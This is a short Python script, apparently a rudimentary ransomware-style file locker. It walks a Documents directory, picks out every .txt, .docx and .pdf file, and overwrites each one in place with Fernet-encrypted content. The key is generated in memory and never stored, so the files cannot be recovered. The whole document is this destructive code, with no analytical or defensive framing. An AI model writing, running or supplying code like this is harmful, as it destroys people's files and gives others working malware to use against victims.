import os
import base64
import hashlib
import random
import string
from cryptography.fernet import Fernet

def generate_key():
    return Fernet.generate_key()

def encrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, 'rb') as file:
        original = file.read()
    encrypted = fernet.encrypt(original)
    with open(file_path, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)

def find_important_files(directory):
    important_files = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith('.txt') or file.endswith('.docx') or file.endswith('.pdf'):
                important_files.append(os.path.join(root, file))
    return important_files

def main():
    key = generate_key()
    directory = '/Documents'
    important_files = find_important_files(directory)
    for file in important_files:
        encrypt_file(file, key)
    print('Encryption complete!')

if __name__ == '__main__':
    main()